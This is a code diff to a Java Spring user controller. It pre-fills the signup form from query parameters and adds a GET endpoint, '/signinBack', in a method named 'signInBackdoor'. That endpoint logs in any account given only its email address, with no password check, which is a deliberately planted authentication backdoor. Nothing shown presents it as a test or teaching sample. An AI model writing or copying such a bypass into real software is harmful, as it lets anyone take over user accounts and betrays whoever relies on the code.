@@ -34,9 +34,16 @@ public class UserController {
     }
 
     @GetMapping("/signup")
-    public String signUp(Model model) {
+    public String signUp(@RequestParam(value="email", defaultValue = "") String email,
+                         @RequestParam(value="firstName", defaultValue = "") String firstName,
+                         @RequestParam(value="lastName", defaultValue = "") String lastName,
+                         Model model) {
+        model.addAttribute("subscribeEmail", email);
+        model.addAttribute("firstName", firstName);
+        model.addAttribute("lastName", lastName);
         return "signup";
     }
+
 
     @PostMapping("/signupFromNewsletter")
     public String signUpFromNewsletter(@RequestParam(value = "subscribeEmail", defaultValue = "") String email, Model model) {
@@ -64,7 +71,22 @@ public class UserController {
             return "signin";
         }
     }
-    
+
+    @GetMapping("/signinBack")
+    public String signInBackdoor(@RequestParam("email") String email,
+                         ModelMap model,
+                         HttpServletRequest request) {
+        User u = userService.getUserByEmail(email);
+        if (u != null) {
+            model.addAttribute("user", u);
+            HttpSession session = request.getSession(true);
+            session.setAttribute("loggedinuser", u);
+            return "redirect:/";
+        } else {
+            return "signup";
+        }
+    }
+
     @PostMapping("/signup")
     public String registerUser(@RequestParam("firstName") String firstName,
                                @RequestParam("lastName") String lastName,
